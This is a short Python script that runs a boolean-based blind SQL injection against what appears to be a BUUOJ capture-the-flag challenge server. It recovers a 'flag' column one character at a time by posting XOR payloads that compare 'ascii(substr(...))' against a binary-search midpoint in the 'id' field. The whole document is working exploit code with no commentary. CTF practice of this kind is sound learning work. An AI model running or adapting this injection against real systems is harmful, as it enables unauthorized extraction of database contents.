import requests
import time
import re
url='http://08ec02e2-3abd-4938-92d9-190bdf821261.node4.buuoj.cn:81/'
flag = ''
for i in range(1,43):
    max = 127
    min = 0
    for c in range(0,127):
        s = (int)((max+min)/2)
        payload = '0^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'
        r = requests.post(url,data = {'id':payload})
        time.sleep(0.005)
        if 'Hello, glzjin wants a girlfriend.' in str(r.content):
            min=s
        else:
            max=s
        if((max-min)<=1):
            flag+=chr(max)
            print(flag)
            break
